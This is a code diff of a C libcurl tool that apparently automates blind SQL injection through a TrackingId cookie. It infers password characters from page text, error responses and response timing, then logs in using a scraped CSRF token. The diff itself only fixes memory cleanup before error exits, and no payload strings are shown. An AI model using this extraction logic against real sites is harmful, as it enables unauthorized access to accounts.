@@ -691,8 +691,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
 
             extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);
@@ -727,8 +727,8 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
 
                     if (performCurlRequest(curl, response_buffer) != 0) {
-                        goto quit;
                         free(header);
+                        goto quit;
                     }
                     if (strstr(response_buffer, "Welcome back!") != NULL) {
                         if (character + i > 'z') {
@@ -754,8 +754,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
 
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -765,8 +765,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
 
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
             free(header);
         }
@@ -781,8 +781,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
 
             extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);
@@ -816,8 +816,8 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
 
                     if (performCurlRequest(curl, response_buffer) != 0) {
-                        goto quit;
                         free(header);
+                        goto quit;
                     }
                     if (strstr(response_buffer, "Internal") != NULL) {
                         strncpy(password_temp, password, strlen(password));
@@ -829,8 +829,8 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
 
                     if (performCurlRequest(curl, response_buffer) != 0) {
-                        goto quit;
                         free(header);
+                        goto quit;
                     }
                     if (strstr(response_buffer, "Internal") == NULL) {
                         left = mid + 1;
@@ -850,8 +850,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
 
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -861,8 +861,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
 
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
             free(header);
         }
@@ -913,8 +913,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 
              if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
-                free(header);
+                 free(header);
+                 goto quit;
             }
 
             extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);
@@ -947,8 +947,8 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
 
                     if (performCurlRequest(curl, response_buffer) != 0) {
-                        goto quit;
                         free(header);
+                        goto quit;
                     }
                     curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &totalTime);
                     if (totalTime > 1.00) {
@@ -969,8 +969,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
 
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -981,8 +981,8 @@ int vulnerabilities(char *url) {
 
             sleep(2);
             if (performCurlRequest(curl, response_buffer) != 0) {
-                goto quit;
                 free(header);
+                goto quit;
             }
             free(header);
         }
